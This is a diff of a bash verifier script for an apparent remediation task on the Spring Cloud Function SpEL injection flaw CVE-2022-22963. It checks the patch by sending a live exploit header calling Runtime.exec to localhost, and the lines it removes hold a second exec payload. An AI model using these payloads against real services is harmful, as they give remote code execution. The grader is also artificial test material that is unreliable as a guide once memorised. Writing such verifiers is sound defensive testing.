@@ -1,54 +1,65 @@
 #!/bin/bash
 # Scenario 06: Spring Cloud Function SpEL injection (CVE-2022-22963)
+#
+# BEHAVIOURAL verifier. It does not grep the jar version (and does not rely on
+# unzip, which is absent from the runtime image). It fires the real exploit at
+# the LIVE service: a POST /functionRouter carrying a
+# `spring.cloud.function.routing-expression` header whose SpEL runs
+# `Runtime.exec("touch <nonce>")`. On a vulnerable build (<= 3.2.2) the header
+# is evaluated and the nonce file appears => RCE => FAIL. On a patched build
+# (>= 3.2.3) the header is not evaluated as SpEL and no file appears => PASS.
+#
+# Truth table:
+#   3.2.2 running                 -> file created -> FAIL
+#   3.2.3 + app restarted         -> none         -> PASS
+#   3.2.3 jars but NOT restarted  -> file created -> FAIL (old JVM)
+#   nothing done                  -> file created -> FAIL
+
 set -u
-ver_ge() { [ "$(printf '%s\n%s\n' "$2" "$1" | sort -V | head -1)" = "$2" ]; }
+URL=http://127.0.0.1:8080
+NONCE="/tmp/.scf_poc_$$_$(date +%s)"
 
-JAR=/opt/app/app.jar
-[ -f "$JAR" ] || { echo "FAIL [PoC]: $JAR not found." >&2; exit 1; }
+cleanup() { rm -f "$NONCE"; }
+trap cleanup EXIT INT TERM
 
-# Extract spring-cloud-function-web version from the fat jar
-SCF_JAR=$(unzip -l "$JAR" 2>/dev/null | grep -oE 'BOOT-INF/lib/spring-cloud-function-web-[0-9.]+\.jar' | head -1)
-[ -z "$SCF_JAR" ] && { echo "FAIL [PoC]: spring-cloud-function-web jar not found inside $JAR." >&2; exit 1; }
-
-VER=$(echo "$SCF_JAR" | sed -E 's/.*spring-cloud-function-web-([0-9.]+)\.jar/\1/')
-
-SAFE=0
-case "$VER" in
-    3.1.*) ver_ge "$VER" "3.1.7" && SAFE=1 ;;
-    3.2.*) ver_ge "$VER" "3.2.3" && SAFE=1 ;;
-    *)     ver_ge "$VER" "3.2.3" && SAFE=1 ;;
-esac
-
-if [ "$SAFE" != "1" ]; then
-    echo "FAIL [PoC]: spring-cloud-function-web is $VER (need >= 3.2.3 or >= 3.1.7)." >&2
+# The image CMD boots the app (see .preserve-cmd); a live daemon is expected.
+# verify.sh must NOT start it - a dead service is a failure.
+UP=0
+for i in $(seq 1 40); do
+    if curl -sf -o /dev/null -m 3 -X POST -H 'Content-Type: text/plain' \
+            -d 'ping' "$URL/uppercase"; then UP=1; break; fi
+    sleep 1
+done
+if [ "$UP" != "1" ]; then
+    echo "FAIL [Regression]: app not reachable on 8080 - a dead service is a failure." >&2
     exit 1
 fi
-echo "PASS [PoC]: spring-cloud-function-web upgraded to $VER."
 
-# PoC (behavioral): attempt SpEL injection via spring.cloud.function.routing-expression
-# A patched version rejects the header and returns 400/500 instead of executing code.
-for i in $(seq 1 10); do
-    if curl -sf -o /dev/null -m 3 "http://127.0.0.1:8080/uppercase"; then
-        SPEL_RESP=$(curl -s -m 5 -X POST \
-            -H 'Content-Type: text/plain' \
-            -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")' \
-            -d 'test' "http://127.0.0.1:8080/functionRouter" 2>/dev/null || true)
-        if echo "$SPEL_RESP" | grep -q 'uid='; then
-            echo "FAIL [PoC]: SpEL injection executed — CVE-2022-22963 still exploitable." >&2
-            exit 1
-        fi
-        echo "PASS [PoC]: SpEL injection via routing-expression did not execute."
-        break
-    fi
-    sleep 2
-done
+###############################################################################
+# PoC: drive the SpEL injection and check for the RCE side effect.
+###############################################################################
+rm -f "$NONCE"
+curl -s -o /dev/null -m 6 -X POST -H 'Content-Type: text/plain' \
+    -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{\"touch\",\"$NONCE\"})" \
+    -d 'test' "$URL/functionRouter" 2>/dev/null
+sleep 2
 
-# Regression: the uppercase function must still work
-for i in $(seq 1 20); do
-    R=$(curl -sf -m 3 -X POST -H 'Content-Type: text/plain' \
-        -d 'hello' "http://127.0.0.1:8080/uppercase" 2>/dev/null || true)
-    [ "$R" = "HELLO" ] && { echo "PASS [Regression]: /uppercase returns HELLO."; exit 0; }
-    sleep 2
-done
-echo "FAIL [Regression]: /uppercase did not return HELLO." >&2
-exit 1
+if [ -e "$NONCE" ]; then
+    echo "FAIL [PoC]: the routing-expression header executed code (created $NONCE)" >&2
+    echo "            - CVE-2022-22963 SpEL injection is still exploitable." >&2
+    exit 1
+fi
+echo "PASS [PoC]: routing-expression SpEL was not evaluated (no code execution)."
+
+###############################################################################
+# Regression: the uppercase function must still work.
+###############################################################################
+R=$(curl -sf -m 5 -X POST -H 'Content-Type: text/plain' -d 'hello' "$URL/uppercase" 2>/dev/null || true)
+if [ "$R" != "HELLO" ]; then
+    echo "FAIL [Regression]: /uppercase did not return HELLO (got '$R')." >&2
+    exit 1
+fi
+echo "PASS [Regression]: /uppercase returns HELLO."
+
+echo "All checks passed."
+exit 0
